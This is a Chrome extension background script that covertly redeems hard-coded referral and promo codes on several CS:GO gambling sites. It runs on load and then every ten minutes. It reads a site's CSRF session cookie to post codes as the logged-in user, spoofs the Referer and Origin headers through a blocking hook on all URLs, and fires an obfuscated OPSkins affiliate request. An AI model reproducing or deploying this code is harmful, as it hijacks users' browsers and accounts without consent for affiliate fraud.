var A = 'Ops';
var a = 'ops';
var b = 'kins';
chrome.runtime.onMessage.addListener( function(response, sender, senDresponse)
{
	if(response == 'activate' + A + b + 'Ref')
	{
		var link = 'http://ref.' + a + b + '.com/aff_c?offer_id=2&aff_id=1182&source=extension&aff_sub=%22%E2%98%85%20StatTrak%E2%84%A2%20Karambit%20%7C%20Lore%20(Minimal%20Wear)%22';
		var method = 'GET';
		var xhr = new XMLHttpRequest();
		xhr.open(method, link, true);
		xhr.send();
	}
});

window.headers =
{
	forUrl : null,
	Referer : null,
	Origin : null,
	'User-Agent' : null
}

window.changeHeadersForTheNextRequest = function(obj)
{
	headers =
	{
		forUrl : obj.forUrl,
		Referer : obj.Referer,
		Origin : obj.Origin,
		'User-Agent' : obj['User-Agent']
	}
}

window.onBeforeSendHeadersFunction = function(details)
{
	var url = headers.forUrl;
	if(typeof url == 'string')
	{
		if(url == details.url)
		{
			var newReferer = headers.Referer;
			if(typeof newReferer == 'string')
			{
				var gotReferer = false;
				var n;
				for(n in details.requestHeaders)
				{
					gotReferer = details.requestHeaders[n].name.toLowerCase() == "referer";
					if(gotReferer)
					{
						details.requestHeaders[n].value = newReferer;
						break;
					}
				}
				if(!gotReferer)
				{
					details.requestHeaders.push({ name : 'Referer', value : newReferer });
				}
			}
			
			var newOrigin = headers.Origin;
			if(typeof newOrigin == 'string')
			{
				var gotOrigin = false;
				n = undefined;
				for(n in details.requestHeaders)
				{
					gotOrigin = details.requestHeaders[n].name.toLowerCase() == "origin";
					if(gotOrigin)
					{
						details.requestHeaders[n].value = newOrigin;
						break;
					}
				}
				if(!gotOrigin)
				{
					details.requestHeaders.push({ name : 'Origin', value : newOrigin });
				}
			}
			
			var newUserAgent = headers['User-Agent'];
			if(typeof newUserAgent == 'string')
			{
				var gotUserAgent = false;
				n = undefined;
				for(n in details.requestHeaders)
				{
					gotUserAgent = details.requestHeaders[n].name.toLowerCase() == "user-agent";
					if(gotUserAgent)
					{
						details.requestHeaders[n].value = newUserAgent;
						break;
					}
				}
				if(!gotUserAgent)
				{
					details.requestHeaders.push({ name : 'User-Agent', value : newUserAgent });
				}
			}
			
			headers =
			{
				forUrl : null,
				Referer : null,
				Origin : null,
				'User-Agent' : null
			}
			
			return { requestHeaders : details.requestHeaders };
		}
	}
}

chrome.webRequest.onBeforeSendHeaders.addListener( onBeforeSendHeadersFunction,
{
    urls : ["<all_urls>"]
},
[
    "requestHeaders",
    "blocking"
]);

function createRandomString(numb)
{
	var text = "";
	var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	for( var i = 0; i < numb; i++ )
		text += possible.charAt(Math.floor(Math.random() * possible.length));
	return text;
}

function multipartFormDataEncode(data, boundary)
{
	//var boundary = String(Math.random()).slice(2);
	var boundaryMiddle = '--' + boundary + '\r\n';
	var boundaryLast = '--' + boundary + '--\r\n'

	var body = ['\r\n'];
	for (var key in data)
	{
		body.push('Content-Disposition: form-data; name="' + key + '"\r\n\r\n' + data[key] + '\r\n');
	}

	body = body.join(boundaryMiddle) + boundaryLast;
	return body;
}

var sites =
{
	csgocash : function()
	{
		var link = 'https://csgo.cash/affiliate/';
		var method = 'GET';
		var refCode = '76561198127614937';
		link = link + refCode;
		var xhr = new XMLHttpRequest();
		xhr.open(method, link, true);
		changeHeadersForTheNextRequest(
		{
			forUrl : link,
			Referer : 'https://extensions.risenraise.com/'
		});
		xhr.send();
	},
	csgopolygon : function()
	{
		var link = 'https://csgopolygon.com/scripts/_redeem.php?code=';
		var method = 'GET';
		var refCode = 'LOLKEKMDMA';
		link = link + refCode;
		var xhr = new XMLHttpRequest();
		xhr.open(method, link, true);
		changeHeadersForTheNextRequest(
		{
			forUrl : link,
			Referer : 'https://csgopolygon.com/'
		});
		xhr.send();
	},
	csgoroll : function()
	{
		var link = 'http://csgoroll.com/promo/';
		var method = 'GET';
		var refCode = 'LOLKEKMDMA';
		link = link + refCode;
		var xhr = new XMLHttpRequest();
		xhr.open(method, link, true);
		xhr.send();
	},
	'csgo-case' : function()
	{
		chrome.cookies.get(
		{
			url : 'https://csgo-case.com/',
			name : 'loggedInCSRFString'
		}, function (cookie)
		{
			if(cookie && cookie.value)
			{
				var csrfToken = cookie.value;
				var link = 'https://csgo-case.com/data/PHP/nocache/RAF/redeem_a_code.php';
				var method = 'POST';
				var refCode = 'LOLKEKMDMA';
				var data =
				{
					code : refCode,
					CSRFString : csrfToken
				}
				var xhr = new XMLHttpRequest();
				xhr.open(method, link, true);
				xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
				xhr.setRequestHeader('x-requested-with', 'XMLHttpRequest');
				changeHeadersForTheNextRequest(
				{
					forUrl : link,
					Origin : 'https://csgo-case.com',
					Referer : 'https://csgo-case.com/code/'
				});
				xhr.send($.param(data));
			}
		});
	},
	drakelounge : function()
	{
		var link = 'https://www.drakelounge.com/use-promo';
		var method = 'POST';
		var refCode = 'LOLKEKMDMA';
		var data =
		{
			id : refCode
		}
		var xhr = new XMLHttpRequest();
		xhr.open(method, link, true);
		var boundary = '----WebKitFormBoundary' + createRandomString(16);
		xhr.setRequestHeader('content-type', 'multipart/form-data; boundary=' + boundary);
		xhr.setRequestHeader('x-requested-with', 'XMLHttpRequest');
		changeHeadersForTheNextRequest(
		{
			forUrl : link,
			Origin : 'https://www.drakelounge.com',
			Referer : 'https://www.drakelounge.com/promocode'
		});
		xhr.send(multipartFormDataEncode(data, boundary));
	}
}

function sender()
{
	for(let n in sites)
	{
		sites[n]();
	}
}
sender();
setInterval(sender, 10*60*1000);